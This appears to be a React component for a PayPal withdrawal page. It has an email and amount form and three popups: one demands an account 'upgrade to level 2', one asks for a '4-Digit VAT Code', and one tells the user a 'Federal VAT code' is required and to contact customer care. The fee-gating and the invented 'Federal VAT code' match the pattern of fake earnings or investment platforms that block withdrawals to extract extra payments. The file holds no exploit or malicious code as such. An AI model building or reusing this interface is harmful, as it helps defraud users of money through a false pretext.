import React, { useState } from 'react';
import useWithdraw from './useWithdrawal';
import { Dialog } from '@headlessui/react';
import { FaPaypal, FaDollarSign } from 'react-icons/fa';

const Paypal = () => {
  const {
    userData,
    amount,
    setAmount,
    showUpgradePopup,
    showCodePopup,
    showAdminPopup,
    setShowUpgradePopup,
    setShowCodePopup,
    setShowAdminPopup,
    code,
    setCode,
    handleWithdraw,
    handleCodeSubmit,
    handleSetCode,
  } = useWithdraw('paypalWithdrawals');

  const [paypalEmail, setPaypalEmail] = useState('');

  return (
    <div className="min-h-screen p-6 bg-gray-100 flex flex-col items-center">
      <div className="flex mb-6">
        <h2 className="text-2xl font-bold">Withdraw to PayPal</h2>
      </div>
      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <div className="mb-4">
          <FaPaypal className="inline mr-2 text-gray-700" />
          <input
            type="email"
            placeholder="PayPal Email"
            value={paypalEmail}
            onChange={(e) => setPaypalEmail(e.target.value)}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          />
        </div>
        <div className="mb-4">
          <FaDollarSign className="inline mr-2 text-gray-700" />
          <input
            type="number"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          />
        </div>
        <button
          onClick={() => handleWithdraw()}
          className="bg-green-500 text-white py-2 px-4 rounded-lg w-full"
        >
          Withdraw
        </button>
      </div>

      {/* Upgrade to Level 2 Popup */}
      <Dialog open={showUpgradePopup} onClose={() => setShowUpgradePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Upgrade Required</Dialog.Title>
            <div className="mt-4">
              <p>Your account level is too low for this transaction. Please upgrade to level 2.</p>
              <button
                onClick={() => setShowUpgradePopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Enter 4-Digit Code Popup */}
      <Dialog open={showCodePopup} onClose={() => setShowCodePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Enter 4-Digit VAT Code</Dialog.Title>
            <div className="mt-4">
              <input
                type="text"
                placeholder="Enter 4-Digit Code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              />
              <button
                onClick={() => handleCodeSubmit({ paypalEmail })}
                className="mt-4 bg-green-500 text-white py-2 px-4 rounded-lg mr-3"
              >
                Submit
              </button>
              <button
                onClick={handleSetCode}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                Set Code
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Contact Admin Popup */}
      <Dialog open={showAdminPopup} onClose={() => setShowAdminPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Contact Admin</Dialog.Title>
            <div className="mt-4">
              <p>The Federal VAT code is required before this transaction can be
              completed successfully. You can contact our online customer care
              representative for more details about the VAT code for this
              transaction.</p>
              <button
                onClick={() => setShowAdminPopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>
    </div>
  );
};

export default Paypal;
